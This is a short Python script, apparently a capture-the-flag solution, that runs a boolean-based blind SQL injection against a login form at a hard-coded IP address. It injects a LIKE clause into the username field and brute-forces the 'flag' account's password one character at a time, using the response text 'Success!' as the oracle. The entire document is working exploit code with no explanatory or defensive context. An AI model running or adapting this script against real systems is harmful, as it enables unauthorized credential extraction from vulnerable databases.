import requests
import string
a="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&'()*+,-./:;<=>?@[\]^`{|}~     _"
url="http://172.104.49.143:1323/"
c=""
while True:
    for i in a:
        data={
            "username":"flag' and password like '"+c+i+"%';-- -",
            "password":"aaaaaaaaaaaaaaa",
            "login":""
        }
        r=requests.post(url,data=data)
        if "Success!" in r.text:
            c+=i
            print(c)
            break
